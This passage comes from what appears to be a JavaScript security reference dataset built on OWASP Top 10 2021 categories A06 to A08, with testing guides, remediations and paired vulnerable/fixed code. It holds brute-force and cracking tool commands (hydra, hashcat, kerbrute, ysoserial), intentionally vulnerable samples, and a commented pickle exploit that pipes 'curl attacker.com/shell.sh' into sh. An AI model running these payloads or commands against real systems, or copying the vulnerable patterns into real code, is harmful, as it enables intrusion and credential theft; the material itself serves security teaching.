//           severity: CRITICAL,HIGH
//           exit-code: 1
//
//       - name: Check for outdated dependencies
//         run: npx npm-check-updates --errorLevel 2 --target minor
//
//       - name: Run tests
//         run: npm test
//
//       - name: Generate SBOM
//         run: npx @cyclonedx/cyclonedx-npm --output-file sbom.json
//
//       - name: Upload SBOM
//         uses: actions/upload-artifact@v4
//         with:
//           name: sbom
//           path: sbom.json`,
      },
    ],

    references: [
      'https://owasp.org/Top10/A06_2021-Vulnerable_and_Outdated_Components/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Vulnerable_Dependency_Management_Cheat_Sheet.html',
      'https://nvd.nist.gov/',
      'https://osv.dev/ (Open Source Vulnerabilities database)',
      'https://github.com/advisories (GitHub Advisory Database)',
      'https://snyk.io/vuln/ (Snyk Vulnerability Database)',
      'Case Study: Equifax breach (2017) -- unpatched Apache Struts CVE-2017-5638 led to 147M records exposed',
      'Case Study: Log4Shell CVE-2021-44228 -- Log4j vulnerability affected millions of Java applications worldwide',
      'Case Study: event-stream incident (2018) -- malicious code injected into popular npm package',
      'Case Study: SolarWinds supply chain attack (2020) -- compromised build system affected 18,000 organizations',
    ],
  },

  // =========================================================================
  // A07:2021 - Identification and Authentication Failures
  // =========================================================================
  {
    id: 'A07',
    name: 'Identification and Authentication Failures',
    description:
      'Confirmation of the user\'s identity, authentication, and session management is critical ' +
      'to protect against authentication-related attacks. There may be authentication weaknesses ' +
      'if the application permits brute force or other automated attacks, permits default, weak, ' +
      'or well-known passwords, uses weak or ineffective credential recovery and forgot-password ' +
      'processes, uses plain text, encrypted, or weakly hashed passwords data stores, has ' +
      'missing or ineffective multi-factor authentication, or exposes session identifiers in the ' +
      'URL. Previously titled "Broken Authentication," this category dropped from second to ' +
      'seventh position due to increased availability of standardized frameworks.',

    impact:
      'Authentication failures can result in complete account takeover, identity theft, ' +
      'unauthorized access to sensitive data and functionality, and privilege escalation. ' +
      'Credential stuffing attacks exploit reused passwords from other breaches to gain ' +
      'access. Session fixation and hijacking allow attackers to impersonate legitimate users. ' +
      'In the worst case, attackers gain administrative access and can compromise the entire system.',

    examples: [
      'Credential stuffing: using breached username/password lists against the application',
      'Brute force attacks against login endpoints with no rate limiting or lockout',
      'Permitting weak passwords (123456, password, qwerty)',
      'Using knowledge-based authentication (security questions) as sole recovery mechanism',
      'Plain text or reversible encryption for password storage',
      'Missing or broken multi-factor authentication',
      'Session IDs exposed in URLs (?JSESSIONID=abc123)',
      'Session fixation: accepting session tokens from URL parameters or form fields',
      'Sessions not properly invalidated on logout',
      'Session tokens not rotated after authentication',
      'Long or infinite session timeouts',
      'Missing re-authentication for privilege-level changes',
      'Exposing whether an account exists via different error messages ("user not found" vs "wrong password")',
      'Default credentials not changed on administrative interfaces',
      'Password reset tokens sent over insecure channels',
      'Missing account lockout allowing unlimited authentication attempts',
      'JWT tokens without expiration or with excessively long lifetimes',
      'OAuth misconfiguration: missing state parameter, open redirect in callback',
      'Insecure "remember me" functionality storing credentials in cookies',
      'Missing certificate-based authentication for API-to-API communication',
      'No password history enforcement (users reuse the same password)',
      'Account creation without email verification',
      'Missing CAPTCHA or proof-of-work on authentication endpoints',
      'Insecure password change allowing change without current password',
      'Credential storage in browser autocomplete for sensitive applications',
    ],

    testingGuide: [
      '1. Test for brute force: attempt 1000+ logins with a wordlist',
      '2. Test for credential stuffing: use known breach datasets',
      '3. Test password policy: try weak passwords (123456, password, aaa, single char)',
      '4. Test for account enumeration: compare responses for valid vs invalid usernames',
      '5. Test for account enumeration in registration: check if "username taken" is revealed',
      '6. Test for account enumeration in password reset: different responses for existing vs non-existing emails',
      '7. Test session management: analyze session token entropy and randomness',
      '8. Test session fixation: set a session token before authentication and check if it persists',
      '9. Test session hijacking: capture and replay session tokens',
      '10. Test session timeout: verify sessions expire after inactivity period',
      '11. Test concurrent sessions: check if multiple simultaneous sessions are detected/limited',
      '12. Test session invalidation: verify logout properly destroys server-side session',
      '13. Test "remember me": analyze token storage, duration, and security properties',
      '14. Test password reset: token predictability, expiration, single-use enforcement',
      '15. Test password reset: can the token be reused after password change?',
      '16. Test MFA bypass: try removing MFA parameters from requests',
      '17. Test MFA brute force: attempt all possible OTP values',
      '18. Test for OAuth flaws: missing state parameter, open redirect',
      '19. Test for JWT vulnerabilities: algorithm confusion, key leakage, claim tampering',
      '20. Test for insecure token storage: check cookies, localStorage, URL parameters',
      '21. Test password change: can it be done without the current password?',
      '22. Test for default credentials: admin/admin, root/root, test/test',
      '23. Test for password spray: try common passwords against many accounts',
      '24. Test for timing attacks: measure response time differences for valid vs invalid users',
      '25. Test for CSRF on login: cross-site login to attacker-controlled account',
      '26. Test for subdomain session sharing: cookies scoped too broadly',
      '27. Test re-authentication: check if sensitive operations require re-auth',
      '28. Test for session ID in URL: check if JSESSIONID or similar appears in URLs',
      '29. Test for insufficient session rotation: is session ID changed after login?',
      '30. Test for insecure "forgot password" hints or answers',
    ],

    tools: [
      'Hydra: hydra -l admin -P rockyou.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:Invalid"',
      'Burp Suite: Intruder for credential attacks, Session handling rules',
      'Patator: patator http_fuzz url=https://target.com/login method=POST body="user=FILE0&pass=FILE1" 0=users.txt 1=pass.txt',
      'Medusa: medusa -h target.com -u admin -P passwords.txt -M http',
      'CeWL: cewl https://target.com -m 6 -w wordlist.txt (custom wordlist from target)',
      'wfuzz: wfuzz -z file,users.txt -z file,pass.txt --hc 401 https://target.com/login',
      'jwt_tool: python3 jwt_tool.py <token> -T (JWT testing)',
      'hashcat: hashcat -m 3200 hashes.txt wordlist.txt (bcrypt cracking)',
      'john: john --format=bcrypt hashes.txt',
      'Nuclei: nuclei -u https://target.com -t default-logins/ -t exposed-panels/',
      'OWASP ZAP: session management testing, authentication testing',
      'Credential databases: HaveIBeenPwned API for breach checks',
      'enum4linux: enum4linux -a target.com (Windows/Samba enumeration)',
      'kerbrute: kerbrute userenum --dc target.com -d domain.local users.txt',
      'OAuth security scanner: check for state parameter, redirect URI validation',
    ],

    remediation: [
      'Implement multi-factor authentication (TOTP, WebAuthn/FIDO2, push notifications)',
      'Do not ship or deploy with default credentials; force change on first use',
      'Implement weak password checks: reject passwords in common breach lists (top 10K)',
      'Align password policy with NIST 800-63b: min 8 chars, no composition rules, no rotation',
      'Use bcrypt, scrypt, Argon2id, or PBKDF2 for password hashing with appropriate work factors',
      'Implement account lockout or exponential backoff after failed login attempts',
      'Use a centralized, battle-tested authentication framework (not custom implementations)',
      'Implement rate limiting on authentication endpoints (IP-based and account-based)',
      'Generate session IDs with high entropy using cryptographic random generators',
      'Rotate session IDs after successful authentication',
      'Invalidate sessions on logout, password change, and after idle timeout',
      'Set session timeout to a reasonable duration (15-30 minutes for sensitive apps)',
      'Use secure cookie attributes: HttpOnly, Secure, SameSite, proper Domain/Path',
      'Implement re-authentication for sensitive operations',
      'Use constant-time comparison for credentials and tokens to prevent timing attacks',
      'Log and monitor all authentication events: failures, lockouts, MFA requests',
    ],

    codeExamples: [
      {
        title: 'Vulnerable: Weak Authentication in Python Flask',
        language: 'python',
        vulnerable: `
@app.route('/login', methods=['POST'])
def login():
    username = request.form['username']
    password = request.form['password']

    user = User.query.filter_by(username=username).first()
    if not user:
        return 'User not found', 401  # Reveals user existence
    if user.password != password:  # Plaintext comparison
        return 'Wrong password', 401  # Different message reveals which field is wrong

    session['user_id'] = user.id  # No session rotation
    session.permanent = True
    app.permanent_session_lifetime = timedelta(days=365)  # 1 year session
    return redirect('/dashboard')

@app.route('/register', methods=['POST'])
def register():
    username = request.form['username']
    password = request.form['password']  # No strength check
    user = User(username=username, password=password)  # Plaintext storage
    db.session.add(user)
    db.session.commit()
    return redirect('/login')`,
        fixed: `
from flask_limiter import Limiter
from flask_login import login_user, logout_user
import bcrypt
import secrets

limiter = Limiter(app, key_func=get_remote_address)

@app.route('/login', methods=['POST'])
@limiter.limit('5 per minute')  # Rate limiting
def login():
    username = request.form.get('username', '')
    password = request.form.get('password', '')

    user = User.query.filter_by(username=username).first()

    # Constant-time comparison: always hash even if user not found
    if user:
        valid = bcrypt.checkpw(
            password.encode('utf-8'),
            user.password_hash.encode('utf-8')
        )
    else:
        # Prevent timing-based user enumeration
        bcrypt.checkpw(b'dummy', b'$2b$12$' + b'0' * 53)
        valid = False

    if not valid:
        # Check and increment failed attempts
        if user:
            user.failed_attempts = (user.failed_attempts or 0) + 1
            if user.failed_attempts >= 5:
                user.locked_until = datetime.utcnow() + timedelta(minutes=30)
            db.session.commit()
        return jsonify({'error': 'Invalid credentials'}), 401  # Generic message

    # Check lockout
    if user.locked_until and user.locked_until > datetime.utcnow():
        return jsonify({'error': 'Account temporarily locked'}), 423

    # Reset failed attempts
    user.failed_attempts = 0
    user.locked_until = None
    db.session.commit()

    # Regenerate session to prevent fixation
    session.clear()
    session.regenerate()
    login_user(user, remember=False)
    session.permanent = True
    app.permanent_session_lifetime = timedelta(minutes=30)

    return redirect('/dashboard')

@app.route('/register', methods=['POST'])
@limiter.limit('3 per hour')
def register():
    username = request.form.get('username', '')
    password = request.form.get('password', '')

    # Password strength validation
    if len(password) < 8:
        return jsonify({'error': 'Password must be at least 8 characters'}), 400
    if is_common_password(password):
        return jsonify({'error': 'Password is too common'}), 400

    # Hash with bcrypt
    password_hash = bcrypt.hashpw(
        password.encode('utf-8'),
        bcrypt.gensalt(rounds=12)
    ).decode('utf-8')

    user = User(username=username, password_hash=password_hash)
    db.session.add(user)
    db.session.commit()

    # Send verification email
    send_verification_email(user)
    return jsonify({'message': 'Registration successful. Please verify your email.'})`,
      },
      {
        title: 'Vulnerable: Insecure Session Management in Node.js',
        language: 'javascript',
        vulnerable: `
const session = require('express-session');

app.use(session({
  secret: 'keyboard cat',       // Weak secret
  resave: true,
  saveUninitialized: true,      // Creates sessions for unauthenticated users
  cookie: {
    maxAge: 365 * 24 * 60 * 60 * 1000, // 1 year
    // Missing: secure, httpOnly, sameSite
  },
  // Using default MemoryStore (leaks memory, not for production)
}));

app.post('/login', (req, res) => {
  const user = authenticateUser(req.body.username, req.body.password);
  if (user) {
    req.session.userId = user.id;  // No session regeneration
    req.session.isAdmin = user.isAdmin;
    res.redirect('/dashboard');
  } else {
    res.status(401).send('Login failed');
  }
});

app.get('/logout', (req, res) => {
  req.session.userId = null;  // Does not destroy session
  res.redirect('/login');
});`,
        fixed: `
const session = require('express-session');
const RedisStore = require('connect-redis').default;
const { createClient } = require('redis');
const crypto = require('crypto');

const redisClient = createClient({ url: process.env.REDIS_URL });
redisClient.connect();

app.use(session({
  store: new RedisStore({ client: redisClient }),
  secret: process.env.SESSION_SECRET, // Strong secret from env
  name: '__Host-sid',                  // Cookie name prefix for additional security
  resave: false,
  saveUninitialized: false,            // No session for unauthenticated users
  cookie: {
    maxAge: 30 * 60 * 1000,            // 30 minutes
    secure: true,                       // HTTPS only
    httpOnly: true,                     // No JavaScript access
    sameSite: 'strict',                 // CSRF protection
    path: '/',
    domain: undefined,                  // Current domain only
  },
  genid: () => crypto.randomUUID(),     // Cryptographic session ID
}));

app.post('/login', loginLimiter, async (req, res) => {
  const user = await authenticateUser(req.body.username, req.body.password);
  if (user) {
    // Regenerate session ID to prevent fixation
    req.session.regenerate((err) => {
      if (err) {
        logger.error('Session regeneration failed', { error: err });
        return res.status(500).json({ error: 'Internal error' });
      }
      req.session.userId = user.id;
      req.session.loginTime = Date.now();
      req.session.ipAddress = req.ip;
      req.session.save((err) => {
        if (err) {
          logger.error('Session save failed', { error: err });
          return res.status(500).json({ error: 'Internal error' });
        }
        res.redirect('/dashboard');
      });
    });
  } else {
    res.status(401).json({ error: 'Invalid credentials' });
  }
});

app.post('/logout', (req, res) => {
  const userId = req.session.userId;
  req.session.destroy((err) => {
    if (err) {
      logger.error('Session destruction failed', { error: err, userId });
    }
    res.clearCookie('__Host-sid');
    res.redirect('/login');
  });
});`,
      },
      {
        title: 'Vulnerable: OAuth Implementation Flaws (JavaScript)',
        language: 'javascript',
        vulnerable: `
// Missing state parameter -- vulnerable to CSRF
app.get('/auth/google', (req, res) => {
  const redirectUrl = 'https://accounts.google.com/o/oauth2/auth' +
    '?client_id=' + CLIENT_ID +
    '&redirect_uri=https://example.com/auth/callback' +
    '&response_type=code' +
    '&scope=email profile';
  res.redirect(redirectUrl);
});

// No state validation, open redirect in redirect_uri
app.get('/auth/callback', async (req, res) => {
  const code = req.query.code;
  // No PKCE, no state validation
  const token = await exchangeCode(code);
  const user = await getUserInfo(token.access_token);
  req.session.userId = user.id;
  res.redirect(req.query.redirect || '/dashboard'); // Open redirect
});`,
        fixed: `
const crypto = require('crypto');

app.get('/auth/google', (req, res) => {
  // Generate cryptographic state and PKCE verifier
  const state = crypto.randomBytes(32).toString('hex');
  const codeVerifier = crypto.randomBytes(32).toString('base64url');
  const codeChallenge = crypto.createHash('sha256')
    .update(codeVerifier).digest('base64url');

  // Store in session for validation
  req.session.oauthState = state;
  req.session.codeVerifier = codeVerifier;

  const params = new URLSearchParams({
    client_id: CLIENT_ID,
    redirect_uri: 'https://example.com/auth/callback', // Fixed redirect URI
    response_type: 'code',
    scope: 'email profile',
    state: state,
    code_challenge: codeChallenge,
    code_challenge_method: 'S256',
  });

  res.redirect('https://accounts.google.com/o/oauth2/auth?' + params);
});

app.get('/auth/callback', async (req, res) => {
  const { code, state } = req.query;

  // Validate state parameter
  if (!state || state !== req.session.oauthState) {
    logger.warn('OAuth state mismatch', { ip: req.ip });
    return res.status(403).json({ error: 'Invalid OAuth state' });
  }
  delete req.session.oauthState;

  try {
    // Exchange code with PKCE verifier
    const token = await exchangeCode(code, req.session.codeVerifier);
    delete req.session.codeVerifier;

    const userInfo = await getUserInfo(token.access_token);

    // Find or create user
    let user = await User.findOne({ email: userInfo.email });
    if (!user) {
      user = await User.create({
        email: userInfo.email,
        name: userInfo.name,
        emailVerified: userInfo.email_verified,
      });
    }

    // Regenerate session
    req.session.regenerate((err) => {
      if (err) return res.status(500).json({ error: 'Session error' });
      req.session.userId = user.id;
      // No open redirect -- fixed destination
      res.redirect('/dashboard');
    });
  } catch (err) {
    logger.error('OAuth callback error', { error: err.message });
    res.status(500).json({ error: 'Authentication failed' });
  }
});`,
      },
      {
        title: 'Vulnerable: Insecure MFA Implementation (Java)',
        language: 'java',
        vulnerable: `
@PostMapping("/api/verify-mfa")
public ResponseEntity<?> verifyMfa(
        @RequestParam String code,
        HttpSession session) {
    String userId = (String) session.getAttribute("pendingUserId");
    String expectedCode = (String) session.getAttribute("mfaCode");

    // No attempt limiting -- can brute force 6-digit code
    // Code does not expire
    if (code.equals(expectedCode)) {
        session.setAttribute("authenticated", true);
        return ResponseEntity.ok("Authenticated");
    }
    return ResponseEntity.status(401).body("Invalid code");
}

@PostMapping("/api/send-mfa")
public ResponseEntity<?> sendMfa(HttpSession session) {
    String userId = (String) session.getAttribute("pendingUserId");
    // Using predictable code generation
    String code = String.valueOf(new Random().nextInt(900000) + 100000);
    session.setAttribute("mfaCode", code);
    smsService.send(userService.getPhone(userId), "Your code: " + code);
    return ResponseEntity.ok("Code sent");
}`,
        fixed: `
@PostMapping("/api/verify-mfa")
public ResponseEntity<?> verifyMfa(
        @RequestParam String code,
        HttpSession session) {
    String userId = (String) session.getAttribute("pendingUserId");
    if (userId == null) {
        return ResponseEntity.status(401).body("No pending authentication");
    }

    // Check attempt count
    Integer attempts = (Integer) session.getAttribute("mfaAttempts");
    if (attempts != null && attempts >= 3) {
        session.invalidate();
        return ResponseEntity.status(423)
            .body("Too many attempts. Please log in again.");
    }

    // Check code expiration (5 minutes)
    Long codeTime = (Long) session.getAttribute("mfaCodeTime");
    if (codeTime == null || System.currentTimeMillis() - codeTime > 300000) {
        session.removeAttribute("mfaCode");
        return ResponseEntity.status(401).body("Code expired. Request a new one.");
    }

    String expectedCode = (String) session.getAttribute("mfaCode");

    // Constant-time comparison
    if (MessageDigest.isEqual(
            code.getBytes(StandardCharsets.UTF_8),
            expectedCode.getBytes(StandardCharsets.UTF_8))) {
        // Invalidate code after use
        session.removeAttribute("mfaCode");
        session.removeAttribute("mfaAttempts");

        // Create new authenticated session (prevent fixation)
        String newSessionId = session.getId(); // Rotate session
        session.setAttribute("authenticated", true);
        session.setAttribute("userId", userId);
        session.removeAttribute("pendingUserId");

        auditLog.record("mfa_success", userId);
        return ResponseEntity.ok("Authenticated");
    }

    // Increment attempts
    session.setAttribute("mfaAttempts", (attempts != null ? attempts : 0) + 1);
    auditLog.record("mfa_failure", userId);
    return ResponseEntity.status(401).body("Invalid code");
}

@PostMapping("/api/send-mfa")
public ResponseEntity<?> sendMfa(HttpSession session) {
    String userId = (String) session.getAttribute("pendingUserId");
    if (userId == null) {
        return ResponseEntity.status(401).body("No pending authentication");
    }

    // Rate limit: max 3 codes per 15 minutes
    if (!mfaRateLimiter.isAllowed(userId)) {
        return ResponseEntity.status(429).body("Too many requests");
    }

    // Cryptographically secure code
    String code = String.format("%06d", new SecureRandom().nextInt(1000000));
    session.setAttribute("mfaCode", code);
    session.setAttribute("mfaCodeTime", System.currentTimeMillis());
    session.setAttribute("mfaAttempts", 0);

    smsService.send(userService.getPhone(userId), "Your code: " + code);
    return ResponseEntity.ok("Code sent");
}`,
      },
    ],

    references: [
      'https://owasp.org/Top10/A07_2021-Identification_and_Authentication_Failures/',
      'https://cheatsheetseries.owasp.org/cheatsheets/Authentication_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Session_Management_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Multifactor_Authentication_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Forgot_Password_Cheat_Sheet.html',
      'https://cheatsheetseries.owasp.org/cheatsheets/Credential_Stuffing_Prevention_Cheat_Sheet.html',
      'https://pages.nist.gov/800-63-3/sp800-63b.html (NIST Digital Identity Guidelines)',
      'Case Study: Yahoo breach (2013-2014) -- 3 billion accounts compromised, weak MD5 hashing',
      'Case Study: LinkedIn breach (2012) -- 6.5 million SHA-1 hashed passwords leaked',
      'Case Study: Colonial Pipeline (2021) -- compromised VPN credentials led to ransomware attack',
    ],
  },

  // =========================================================================
  // A08:2021 - Software and Data Integrity Failures
  // =========================================================================
  {
    id: 'A08',
    name: 'Software and Data Integrity Failures',
    description:
      'Software and data integrity failures relate to code and infrastructure that does not ' +
      'protect against integrity violations. This includes using software from untrusted sources, ' +
      'repositories, or CDNs without integrity verification; insecure CI/CD pipelines that can ' +
      'introduce unauthorized access, malicious code, or system compromise; and auto-update ' +
      'functionality that downloads and applies updates without sufficient integrity verification. ' +
      'This is a new category for 2021, focusing on making assumptions about software updates, ' +
      'critical data, and CI/CD pipelines without verifying integrity. CWE-829 (Inclusion of ' +
      'Functionality from Untrusted Control Sphere) and CWE-494 (Download of Code Without ' +
      'Integrity Check) are notable CWEs.',

    impact:
      'Supply chain attacks can compromise thousands of organizations through a single ' +
      'compromised component. Insecure CI/CD pipelines can be exploited to inject malicious ' +
      'code into production builds. Deserialization vulnerabilities can lead to remote code ' +
      'execution. Compromised auto-update mechanisms can distribute malware to all users. ' +
      'The SolarWinds attack demonstrated how supply chain compromise can affect over ' +
      '18,000 organizations including government agencies.',

    examples: [
      'Loading JavaScript from CDNs without Subresource Integrity (SRI) hashes',
      'Auto-update mechanisms without signature verification',
      'Insecure deserialization: unserializing untrusted data without validation',
      'CI/CD pipeline without proper access control or audit logging',
      'Using unsigned or unverified software packages',
      'Missing code signing for distributed applications',
      'Package repository compromise (typosquatting, dependency confusion)',
      'Insecure plugin/extension loading without verification',
      'Missing integrity checks on configuration data',
      'CI/CD secrets exposed in build logs or environment',
      'Build artifacts not cryptographically signed',
      'Docker images pulled without content trust verification',
      'Git hooks or CI scripts that execute unvalidated code',
      'Missing input validation on serialized/marshalled data',
      'Third-party API responses used without validation',
      'Database migrations executed without review or approval',
      'Infrastructure as Code changes applied without peer review',
      'Missing SBOM (Software Bill of Materials) for deployed software',
      'Unverified firmware updates for IoT devices',
      'Compromised build servers without detection mechanisms',
    ],

    testingGuide: [
      '1. Check all CDN-loaded scripts for SRI integrity attributes',
      '2. Review CI/CD pipeline configuration for security controls',
      '3. Test deserialization endpoints with crafted payloads',
      '4. Verify that software updates include signature verification',
      '5. Check for dependency confusion: attempt to register internal package names on public registries',
      '6. Review build pipeline secrets management (not hardcoded, properly scoped)',
      '7. Test for insecure deserialization: Java ObjectInputStream, Python pickle, PHP unserialize',
      '8. Verify Docker content trust is enabled (DOCKER_CONTENT_TRUST=1)',
      '9. Check for unsigned npm/PyPI/Maven packages',
      '10. Review CI/CD pipeline for proper branch protection and approval requirements',
      '11. Test for prototype pollution via JSON.parse on untrusted data',
      '12. Check for missing integrity verification on downloaded files',
      '13. Review auto-update mechanisms for man-in-the-middle vulnerabilities',
      '14. Test for YAML deserialization attacks (yaml.load vs yaml.safe_load)',
      '15. Verify that build artifacts are reproducible',
      '16. Check for leaked CI/CD tokens in public repositories',
      '17. Review package.json for preinstall/postinstall script abuse potential',
      '18. Test for XML external entity injection via deserialization',
      '19. Verify cryptographic signing of release artifacts',
      '20. Check for exposed .npmrc, .pypirc, settings.xml with credentials',
    ],

    tools: [
      'Sigstore/cosign: cosign verify --key cosign.pub image:tag (container signature verification)',
      'npm audit signatures: npm audit signatures (verify package registry signatures)',
      'in-toto: in-toto-verify (supply chain security framework)',
      'SLSA: Supply chain Levels for Software Artifacts assessment',
      'Trivy: trivy image --security-checks vuln,secret,config image:tag',
      'Syft: syft image:tag -o spdx-json (SBOM generation)',
      'Grype: grype sbom:./sbom.json (vulnerability scanning against SBOM)',
      'ysoserial: java -jar ysoserial.jar CommonsCollections1 "id" (Java deserialization payloads)',
      'marshalsec: Java unmarshalling exploit tool',
      'GitGuardian: ggshield secret scan ci (secrets detection in CI)',
      'step-security/harden-runner: GitHub Actions security monitoring',
      'Scorecard: scorecard --repo=github.com/org/repo (OpenSSF security health metrics)',
      'Dependency Review Action: GitHub action for PR dependency change review',
      'Socket.dev: supply chain security platform',
      'Snyk Container: container image vulnerability scanning',
    ],

    remediation: [
      'Use digital signatures to verify software and data integrity',
      'Use Subresource Integrity (SRI) for all CDN-loaded scripts and stylesheets',
      'Verify that npm/pip/Maven packages come from trusted, official repositories',
      'Implement dependency review as part of code review process',
      'Use lockfiles and verify their integrity in CI/CD',
      'Implement CI/CD pipeline security: branch protection, required reviews, signed commits',
      'Avoid insecure deserialization: use safe formats (JSON) or validate before deserializing',
      'Implement signing and verification for all build artifacts',
      'Enable Docker Content Trust for container image verification',
      'Use SLSA framework to improve supply chain security posture',
      'Implement proper secrets management in CI/CD (vault, sealed secrets)',
      'Generate and maintain SBOMs for all deployed software',
      'Implement integrity monitoring for critical files and configurations',
      'Use reproducible builds to detect build system compromise',
      'Implement automated security gates in CI/CD pipelines',
    ],

    codeExamples: [
      {
        title: 'Vulnerable: Insecure Deserialization in Python',
        language: 'python',
        vulnerable: `
import pickle
import yaml

@app.route('/api/import', methods=['POST'])
def import_data():
    # Pickle deserialization -- allows arbitrary code execution
    data = pickle.loads(request.data)
    process_data(data)
    return jsonify({'status': 'imported'})

@app.route('/api/config', methods=['POST'])
def update_config():
    # yaml.load with untrusted data -- allows arbitrary code execution
    config = yaml.load(request.data)
    apply_config(config)
    return jsonify({'status': 'updated'})

# Attacker can craft a pickle payload that executes arbitrary commands:
# import pickle, os
# class Exploit(object):
#     def __reduce__(self):
#         return (os.system, ('curl attacker.com/shell.sh | sh',))
# payload = pickle.dumps(Exploit())`,
        fixed: `
import json
import yaml
import jsonschema

CONFIG_SCHEMA = {
    'type': 'object',
    'properties': {
        'theme': {'type': 'string', 'enum': ['light', 'dark']},
        'language': {'type': 'string', 'pattern': '^[a-z]{2}$'},
        'pageSize': {'type': 'integer', 'minimum': 10, 'maximum': 100},
    },
    'additionalProperties': False,
}

@app.route('/api/import', methods=['POST'])
def import_data():
    # Use JSON instead of pickle -- safe data format
    try:
        data = json.loads(request.data)
    except json.JSONDecodeError:
        return jsonify({'error': 'Invalid JSON'}), 400

    # Validate against expected schema
    if not validate_import_schema(data):
        return jsonify({'error': 'Invalid data format'}), 400

    process_data(data)
    return jsonify({'status': 'imported'})

@app.route('/api/config', methods=['POST'])
def update_config():
    # Use yaml.safe_load instead of yaml.load
    try:
        config = yaml.safe_load(request.data)
    except yaml.YAMLError:
        return jsonify({'error': 'Invalid YAML'}), 400

    # Validate against strict schema
    try:
        jsonschema.validate(config, CONFIG_SCHEMA)
    except jsonschema.ValidationError as e:
        return jsonify({'error': 'Invalid configuration: ' + str(e)}), 400

    apply_config(config)
    return jsonify({'status': 'updated'})`,
      },
      {
        title: 'Vulnerable: Missing SRI on CDN Scripts (HTML/JavaScript)',
        language: 'javascript',
        vulnerable: `
<!-- Loading scripts from CDN without integrity verification -->
<!-- If the CDN is compromised, malicious code is executed -->
<script src="https://cdn.example.com/jquery-3.6.0.min.js"></script>
<script src="https://cdn.example.com/bootstrap.min.js"></script>
<link rel="stylesheet" href="https://cdn.example.com/bootstrap.min.css">

<!-- Dynamic script loading without verification -->
<script>
  function loadScript(url) {
    const script = document.createElement('script');
    script.src = url;
    document.head.appendChild(script);
  }
  loadScript('https://cdn.example.com/analytics.js');
</script>`,
        fixed: `
<!-- Loading scripts with Subresource Integrity (SRI) -->
<script
  src="https://cdn.example.com/jquery-3.6.0.min.js"
  integrity="sha384-vtXRMe3mGCbOeY7l30aIg8H9p3GdeSe4IFlP6G8JMa7o7lXvnz3GFKzPxzJdPfGK"
  crossorigin="anonymous"></script>

<script
  src="https://cdn.example.com/bootstrap.min.js"
  integrity="sha384-kenU1KFdBIe4zVF0s0G1M5b4hcpxyD9F7jL+jjXkk+Q2h455rYXK/7HAuoJl+0I4"
  crossorigin="anonymous"></script>

<link
  rel="stylesheet"
  href="https://cdn.example.com/bootstrap.min.css"
  integrity="sha384-Vkoo8x4CGsO3+Hhxv8T/Q5PaXtkKtu6ug5TOeNV6gBiFeWPGFN9MuhOf23Q9Ifjh"
  crossorigin="anonymous">

<!-- Safe dynamic script loading with integrity verification -->
<script>
  function loadScriptSafe(url, expectedHash) {
    return new Promise((resolve, reject) => {
      const script = document.createElement('script');
      script.src = url;
      script.integrity = expectedHash;
      script.crossOrigin = 'anonymous';
      script.onload = resolve;
      script.onerror = () => {
        reject(new Error('Script integrity check failed: ' + url));
      };
      document.head.appendChild(script);
    });
  }

  loadScriptSafe(
    'https://cdn.example.com/analytics.js',
    'sha384-abc123...'
  ).catch(err => console.error(err));
</script>`,
      },
      {
        title: 'Vulnerable: Insecure CI/CD Pipeline (GitHub Actions)',
        language: 'javascript',
        vulnerable: `
// .github/workflows/deploy.yml (shown as JS string)
const insecurePipeline = \`
name: Deploy
on:
  pull_request:
    types: [opened, synchronize]

jobs:
  deploy:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v2  # Outdated action version

      # Secrets in environment -- visible in logs
      - run: echo "Deploying with key $DEPLOY_KEY"
        env:
          DEPLOY_KEY: \${{ secrets.DEPLOY_KEY }}

      # Running PR code with write permissions (pwn request)
      - run: npm install && npm run build

      # No security scanning
      - run: npm run deploy
        env:
          AWS_ACCESS_KEY_ID: \${{ secrets.AWS_KEY }}
          AWS_SECRET_ACCESS_KEY: \${{ secrets.AWS_SECRET }}
\`;`,
        fixed: `
// .github/workflows/deploy.yml (shown as JS string)
const securePipeline = \`
name: Deploy
on:
  push:
    branches: [main]  # Only deploy from main, not PRs

permissions:
  contents: read  # Minimum permissions

jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4  # Pinned to latest version
      - uses: actions/setup-node@v4
        with:
          node-version: '20'
          cache: 'npm'
      - run: npm ci
      - run: npm test
      - run: npm audit --production

  security-scan:
    runs-on: ubuntu-latest
    needs: test
    steps:
      - uses: actions/checkout@v4
      - name: Run Trivy vulnerability scanner
        uses: aquasecurity/trivy-action@0.24.0  # Pinned version
        with:
          scan-type: fs
          severity: CRITICAL,HIGH
          exit-code: 1

  deploy:
    runs-on: ubuntu-latest
    needs: [test, security-scan]
    environment: production  # Requires approval
    permissions:
      id-token: write  # For OIDC
    steps:
      - uses: actions/checkout@v4
      - run: npm ci
      - run: npm run build

      # Use OIDC instead of long-lived credentials
      - uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::123456789:role/deploy-role
          aws-region: us-east-1

      - run: npm run deploy
\`;`,
      },
      {
        title: 'Vulnerable: Insecure Deserialization in Java',
        language: 'java',
        vulnerable: `
@PostMapping("/api/transfer")
public ResponseEntity<?> processTransfer(HttpServletRequest request)
        throws Exception {
    // Deserializing untrusted data -- RCE via gadget chains
    ObjectInputStream ois = new ObjectInputStream(request.getInputStream());
    TransferRequest transfer = (TransferRequest) ois.readObject();
    transferService.process(transfer);
    return ResponseEntity.ok("Transfer processed");
}

@GetMapping("/api/session")
public ResponseEntity<?> restoreSession(@CookieValue String session)
        throws Exception {
    // Deserializing from a cookie -- attacker-controlled
    byte[] data = Base64.getDecoder().decode(session);
    ObjectInputStream ois = new ObjectInputStream(
        new ByteArrayInputStream(data));
    UserSession userSession = (UserSession) ois.readObject();
    return ResponseEntity.ok(userSession);
}`,
        fixed: `
@PostMapping("/api/transfer")
public ResponseEntity<?> processTransfer(
        @Valid @RequestBody TransferRequestDto dto) {
    // Use JSON deserialization with DTO validation instead of Java serialization
    // @Valid triggers Bean Validation annotations
    TransferRequest transfer = new TransferRequest(
        dto.getFromAccount(),
        dto.getToAccount(),
        dto.getAmount()
    );
    transferService.process(transfer);
    return ResponseEntity.ok("Transfer processed");
}

// DTO with validation constraints
public class TransferRequestDto {
    @NotNull
    @Pattern(regexp = "^[0-9]{10}$")
    private String fromAccount;

